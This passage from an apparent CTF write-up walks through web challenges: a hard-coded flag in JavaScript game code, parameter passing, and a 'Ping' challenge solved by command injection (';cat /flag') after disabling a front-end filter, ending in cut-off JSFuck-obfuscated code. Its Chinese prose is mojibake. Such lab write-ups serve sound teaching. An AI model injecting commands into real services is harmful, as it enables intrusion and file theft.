function_">createElementNS</span>(<span class="variable constant_">NAMESPACE_SVG</span>, <span class="string">&#x27;g&#x27;</span>);</span><br><span class="line">            barrierQueueNode.<span class="title function_">setAttribute</span>(<span class="string">&#x27;transform&#x27;</span>, <span class="string">&#x27;scale(1,-1)&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable constant_">MG</span>.<span class="property">barrierQueue</span>.<span class="title function_">init</span>(barrierQueueNode);</span><br><span class="line"></span><br><span class="line">            rootNode.<span class="title function_">appendChild</span>(barrierQueueNode);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            <span class="title function_">goWaitStartLevel</span>();</span><br><span class="line"></span><br><span class="line">            rootNode.<span class="title function_">setAttribute</span>(<span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;visible&#x27;</span>);</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="attr">update</span>: <span class="keyword">function</span> (<span class="params">dt</span>) &#123;</span><br><span class="line">            <span class="variable constant_">MG</span>.<span class="property">missile</span>.<span class="title function_">update</span>(dt);    </span><br><span class="line">            <span class="variable constant_">MG</span>.<span class="property">tunnelWall</span>.<span class="title function_">update</span>(dt);</span><br><span class="line">            <span class="variable constant_">MG</span>.<span class="property">barrierQueue</span>.<span class="title function_">update</span>(dt);    </span><br><span class="line"></span><br><span class="line">            <span class="comment">/* check whether the nearest barrier has been reached and whether the missile collides with it. */</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable constant_">MG</span>.<span class="property">barrierQueue</span>.<span class="title function_">isEmpty</span>()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable constant_">MG</span>.<span class="property">missile</span>.<span class="title function_">getOffset</span>() &lt; <span class="variable constant_">MG</span>.<span class="property">MISSILE_LENGTH</span> &amp;&amp; !<span class="variable constant_">MG</span>.<span class="property">missile</span>.<span class="title function_">isCrashed</span>())&#123;</span><br><span class="line">                    <span class="keyword">var</span> barrier = <span class="variable constant_">MG</span>.<span class="property">barrierQueue</span>.<span class="title function_">nextBarrier</span>();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (barrier.<span class="title function_">collides</span>(<span class="variable constant_">MG</span>.<span class="property">missile</span>.<span class="title function_">getPosition</span>().<span class="property">x</span>, <span class="variable constant_">MG</span>.<span class="property">missile</span>.<span class="title function_">getPosition</span>().<span class="property">y</span>)) &#123;</span><br><span class="line">                        <span class="comment">// CRASH</span></span><br><span class="line">                        <span class="variable constant_">MG</span>.<span class="property">missile</span>.<span class="title function_">onCrash</span>();</span><br><span class="line">                        <span class="title function_">goCrash</span>();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// BARRIER PASSED</span></span><br><span class="line">                        <span class="variable constant_">MG</span>.<span class="property">barrierQueue</span>.<span class="title function_">popBarrier</span>();</span><br><span class="line">                        <span class="variable constant_">MG</span>.<span class="property">missile</span>.<span class="title function_">onBarrierPassed</span>();</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// TODO this block makes loads of assumptions about state</span></span><br><span class="line">                        <span class="keyword">if</span> (mState === <span class="title class_">GameState</span>.<span class="property">RUNNING</span></span><br><span class="line">                         || mState === <span class="title class_">GameState</span>.<span class="property">STARTING</span>) &#123;</span><br><span class="line">                            <span class="keyword">switch</span>(barrier.<span class="title function_">getType</span>()) &#123;</span><br><span class="line">                              <span class="keyword">case</span> <span class="variable constant_">MG</span>.<span class="property">BarrierType</span>.<span class="property">FINISH</span>:</span><br><span class="line">                                <span class="title function_">goFinish</span>();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                              <span class="keyword">case</span> <span class="variable constant_">MG</span>.<span class="property">BarrierType</span>.<span class="property">BLANK</span>:</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                              <span class="keyword">case</span> <span class="variable constant_">MG</span>.<span class="property">BarrierType</span>.<span class="property">START</span>:</span><br><span class="line">                                mState = <span class="title class_">GameState</span>.<span class="property">RUNNING</span>;</span><br><span class="line">                                <span class="comment">// FALLTHROUGH</span></span><br><span class="line">                              <span class="attr">default</span>:</span><br><span class="line">                                mBarriersToPass--;</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">var</span> startVelocity = <span class="title function_">getLevelStartVelocity</span>(mLevel);</span><br><span class="line">                                <span class="keyword">var</span> finishVelocity = <span class="title function_">getLevelFinishVelocity</span>(mLevel);</span><br><span class="line"></span><br><span class="line">                                <span class="variable constant_">MG</span>.<span class="property">missile</span>.<span class="title function_">setVelocity</span>(startVelocity</span><br><span class="line">                                                         + (startVelocity - finishVelocity)</span><br><span class="line">                                                           * (mBarriersToPass - <span class="variable constant_">LEVEL_NUM_BARRIERS</span>)</span><br><span class="line">                                                             / <span class="variable constant_">LEVEL_NUM_BARRIERS</span>);</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;    </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">            <span class="comment">/* Pad the barrier queue with blank barriers so that there are barriers</span></span><br><span class="line"><span class="comment">            as far as can be seen. */</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="variable constant_">MG</span>.<span class="property">barrierQueue</span>.<span class="title function_">numBarriers</span>() &lt; <span class="variable constant_">MG</span>.<span class="property">LINE_OF_SIGHT</span>/<span class="variable constant_">MG</span>.<span class="property">BARRIER_SPACING</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> type = <span class="variable constant_">MG</span>.<span class="property">BarrierType</span>.<span class="property">BLANK</span>;</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span> (mState === <span class="title class_">GameState</span>.<span class="property">RUNNING</span></span><br><span class="line">                 || mState === <span class="title class_">GameState</span>.<span class="property">STARTING</span>) &#123;</span><br><span class="line">                    mRemainingBarriers--;</span><br><span class="line">                    <span class="keyword">if</span> (mRemainingBarriers &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        type = <span class="variable constant_">MG</span>.<span class="property">BarrierType</span>.<span class="property">RANDOM</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mRemainingBarriers === <span class="number">0</span>) &#123;</span><br><span class="line">                        type = <span class="variable constant_">MG</span>.<span class="property">BarrierType</span>.<span class="property">FINISH</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        type = <span class="variable constant_">MG</span>.<span class="property">BarrierType</span>.<span class="property">BLANK</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">    </span><br><span class="line">                <span class="variable constant_">MG</span>.<span class="property">barrierQueue</span>.<span class="title function_">pushBarrier</span>(type);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Update progress */</span></span><br><span class="line">            <span class="keyword">switch</span> (mState) &#123;</span><br><span class="line">              <span class="keyword">case</span> <span class="title class_">GameState</span>.<span class="property">RUNNING</span>:</span><br><span class="line">                mProgress = <span class="number">1</span> - (mBarriersToPass*<span class="variable constant_">MG</span>.<span class="property">BARRIER_SPACING</span> + <span class="variable constant_">MG</span>.<span class="property">missile</span>.<span class="title function_">getOffset</span>())/(<span class="variable constant_">LEVEL_NUM_BARRIERS</span> * <span class="variable constant_">MG</span>.<span class="property">BARRIER_SPACING</span>);</span><br><span class="line">                mBestProgress = <span class="title class_">Math</span>.<span class="title function_">max</span>(mProgress, mBestProgress);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">case</span> <span class="title class_">GameState</span>.<span class="property">FINISHED</span>:</span><br><span class="line">                mProgress = <span class="number">1</span>;</span><br><span class="line">                mBestProgress = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">case</span> <span class="title class_">GameState</span>.<span class="property">STARTING</span>:</span><br><span class="line">                mProgress = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              <span class="attr">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="attr">updateDOM</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> position = <span class="variable constant_">MG</span>.<span class="property">missile</span>.<span class="title function_">getPosition</span>();</span><br><span class="line">            <span class="keyword">var</span> offset = <span class="variable constant_">MG</span>.<span class="property">missile</span>.<span class="title function_">getOffset</span>();</span><br><span class="line"></span><br><span class="line">            <span class="variable constant_">MG</span>.<span class="property">barrierQueue</span>.<span class="title function_">updateDOM</span>(-position.<span class="property">x</span>, -position.<span class="property">y</span>, offset);</span><br><span class="line">            <span class="variable constant_">MG</span>.<span class="property">tunnelWall</span>.<span class="title function_">updateDOM</span>(-position.<span class="property">x</span>, -position.<span class="property">y</span>, offset);</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="attr">onMouseMove</span>: <span class="keyword">function</span> (<span class="params">x, y</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> windowWidth = <span class="variable language_">window</span>.<span class="property">innerWidth</span>;</span><br><span class="line">            <span class="keyword">var</span> windowHeight = <span class="variable language_">window</span>.<span class="property">innerHeight</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable constant_">MG</span>.<span class="property">missile</span>.<span class="title function_">setTarget</span>(x - <span class="number">0.5</span>*windowWidth, -(y - <span class="number">0.5</span>*windowHeight));</span><br><span class="line"></span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="attr">onMouseClick</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable constant_">MG</span>.<span class="property">banner</span>.<span class="title function_">isFullyVisible</span>()) &#123;</span><br><span class="line">                <span class="keyword">switch</span> (mState) &#123;</span><br><span class="line">                  <span class="keyword">case</span> <span class="title class_">GameState</span>.<span class="property">WAIT_START</span>:</span><br><span class="line">                    <span class="title function_">goRun</span>();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  <span class="keyword">case</span> <span class="title class_">GameState</span>.<span class="property">FINISHED</span>:</span><br><span class="line">                    <span class="comment">/* The player is given an infinite number of lives</span></span><br><span class="line"><span class="comment">                    during the qualifying level but these should be</span></span><br><span class="line"><span class="comment">                    removed before continuing. */</span></span><br><span class="line">                    <span class="keyword">if</span> (mLevel === <span class="number">0</span>) &#123;mLives = <span class="variable constant_">STARTING_LIVES</span>;&#125;</span><br><span class="line"></span><br><span class="line">                    mLevel++;</span><br><span class="line"></span><br><span class="line">                    mBestProgress = <span class="number">0.0</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="title function_">goWaitStartLevel</span>();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                  <span class="keyword">case</span> <span class="title class_">GameState</span>.<span class="property">CRASHED</span>:</span><br><span class="line">                    <span class="variable constant_">MG</span>.<span class="property">banner</span>.<span class="title function_">hide</span>();</span><br><span class="line">                    <span class="variable constant_">MG</span>.<span class="property">fog</span>.<span class="title function_">fadeIn</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (mLives === <span class="number">0</span>) &#123;</span><br><span class="line">                                mLevel = <span class="number">0</span>;</span><br><span class="line">                                mLives = <span class="variable constant_">STARTING_LIVES</span>;</span><br><span class="line">                                mBestProgress = <span class="number">0.0</span>;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                mLives--;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                            <span class="variable constant_">MG</span>.<span class="property">missile</span>.<span class="title function_">reset</span>();</span><br><span class="line">                            <span class="variable constant_">MG</span>.<span class="property">barrierQueue</span>.<span class="title function_">reset</span>();</span><br><span class="line"></span><br><span class="line">                            <span class="variable constant_">MG</span>.<span class="property">fog</span>.<span class="title function_">fadeOut</span>();</span><br><span class="line">                            <span class="title function_">goWaitStartLevel</span>();</span><br><span class="line">                        &#125;);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Returns an integer representing the current level */</span></span><br><span class="line">        <span class="attr">getLevel</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> mLevel;</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Returns a human readable string describing the current level */</span></span><br><span class="line">        <span class="attr">getLevelString</span>: getLevelString,</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Returns the number of times the player can crash before game over. */</span></span><br><span class="line">        <span class="comment">/* If the player crashes with zero lives remaining the game ends */</span></span><br><span class="line">        <span class="attr">getNumLives</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> mLives;</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Returns the progress through the level as a value between 0 and 1,</span></span><br><span class="line"><span class="comment">        where 0 is not yet started and 1 is completed. */</span></span><br><span class="line">        <span class="attr">getProgress</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> mProgress;       </span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="attr">getBestProgress</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> mBestProgress;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;());</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹ç„¶åå‘ç°é‡è¦ä»£ç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">text</span>:  <span class="keyword">function</span> (<span class="params"></span>) &#123;<span class="keyword">if</span> (mLevel === <span class="number">6</span>) &#123;<span class="keyword">return</span> <span class="string">&#x27;GOT F|L|A|G &#123;y0u_w1n_th1s_!!!&#125;&#x27;</span>;&#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&#x27;CLICK TO CONTINUE&#x27;</span>;&#125;&#125;,</span><br></pre></td></tr></table></figure><p>â€‹æˆåŠŸè·å¾— flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;y0u_w1n_th1s_!!!&#125;</span><br></pre></td></tr></table></figure><h2 id="4-follow-me-and-hack-me"><a class="markdownIt-Anchor" href="#4-follow-me-and-hack-me">#</a> 4ã€Follow me and hack me</h2><p>â€‹ç›´æ¥ hackbar ä¼ å‚ GETï¼š?CTF=Lit2023       POSTï¼šChallenge=iâ€™m_c0m1ng</p><h2 id="5-ping"><a class="markdownIt-Anchor" href="#5-ping">#</a> 5ã€Pingï¼š</h2><p>â€‹å°è¯• ping ä¸€ä¸‹ 127.0.0.1 èƒ½é€šï¼Œä¹‹åå°è¯•ï¼›ls å‘ç°ä¸è¡Œï¼Œè¢«é™åˆ¶äº†ï¼Œä¸è¿‡ï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç å‘ç°æ˜¯å‰ç«¯è¿‡æ»¤ï¼Œç¦ç”¨ js ä¹‹åå°±èƒ½è¿‡äº†ï¼Œæ— è„‘ï¼›cat /flag æ‹¿åˆ° flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=NSSCTF&#123;1a6530af-202d-463c-b4ea-c0447db5b801&#125;</span><br></pre></td></tr></table></figure><h2 id="6-1zjs"><a class="markdownIt-Anchor" href="#6-1zjs">#</a> 6ã€1zjsï¼š</h2><p>â€‹è¿™ä¸ª 1z çœŸçš„ 1 ç‚¹ä¹Ÿä¸ Ez  (&gt;_&lt;)</p><p>â€‹ç¬¬ä¸€ä»¶äº‹å„¿æŸ¥çœ‹æºç ï¼Œå‘ç°æ–‡ä»¶./dist/index.umd.js</p><p>â€‹åœ¨è¿™ä¸ªæ–‡ä»¶çš„æ³¨é‡Šä¸­æ‰¾åˆ°äº†ä¸€ä¸ªæ–‡ä»¶ï¼šf@k3f1ag.php</p><p>â€‹ä¹‹åè®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(+[![]]+[])[+[]]+(+[]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+[]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]())[!+[]+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![